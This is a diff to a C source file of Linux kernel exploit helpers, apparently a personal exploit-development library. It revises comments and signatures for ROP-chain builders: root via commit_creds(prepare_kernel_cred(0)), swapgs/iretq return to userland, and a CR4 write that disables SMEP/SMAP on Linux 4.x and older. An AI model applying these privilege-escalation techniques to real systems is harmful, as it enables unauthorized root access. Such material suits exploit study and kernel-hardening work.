@@ -6,13 +6,14 @@
 #include "ret2user.h"
 #include "kpti_trampoline.h"
 
-/* Typedef a struct for rop chain rop[]
+/* ============= Struct =============
+ * Typedef a struct for rop chain rop[]
  *      to avoid bug when copying 0 from the chain to buffer
  *
  * ALWAYS use a struct when overflowing a buffer with ROP!
  *      We concept the stuct as a 'buffer' for 'rop', 
  *      while the raw rop chain as 'chain' itself
- * */
+ */
 typedef struct {
     uintptr_t *chain;
     size_t count;
@@ -22,7 +23,7 @@ typedef struct {
 /* ============= Kcreds =============
  * Privesc with commit_creds(prepare_kernel_cred(0));
  *      to become root  
- * */
+ */
 size_t chain_commit_creds(rop_buffer_t rop,
                         uintptr_t pop_rdi_ret,
                         uintptr_t prepare_kernel_cred,
@@ -64,20 +65,19 @@ size_t chain_swapgs_iretq(rop_buffer_t rop,
 
 
 /* ============= CR4 Hijack =============
- * CR4 is a 64-bit control register, 
- *      whewre each bit enables or disables certain CPU features.
- *      
- * Bit 20 (1 << 20) controls SMEP - 1 for on, 0 for off.
+ * Bit 20 (1 << 20): SMEP (Supervisor Mode Execution Protection)
+ * Bit 21 (1 << 21): SMAP (Supervisor Mode Access Prevention)
+ *   - Set to 1: enabled
+ *   - Set to 0: disabled
  *
- * [!] But this is patched since Linux 5.1 in May 2019
- *      native_write_cr4() now ensures that once CR4 is set,
- *      those bits cannot be cleared via ROP or other direct writes
+ * Disabling SMEP/SMAP via CR4 write allows executing or accessing userland pages from ring 0.
  *
- * This works only for Linux 4.* and older.
- * */ 
-
-/* Chain up to zero out 20th bit of CR4 */
-size_t chain_cr4_smep(rop_buffer_t rop, 
+ * [!] NOTE: Since Linux 5.1 (May 2019), native_write_cr4() enforces SMEP/SMAP bits.
+ *     These bits can no longer be cleared via ROP or direct CR4 writes 
+ * 		(will be reset automatically).
+ *     This technique works only on Linux 4.x and older.
+ */
+size_t chain_cr4_smep_smap(rop_buffer_t rop, 
                     uintptr_t pop_rdi_ret,
                     uintptr_t cr4_val,
                     uintptr_t mov_cr4_rdi_ret,
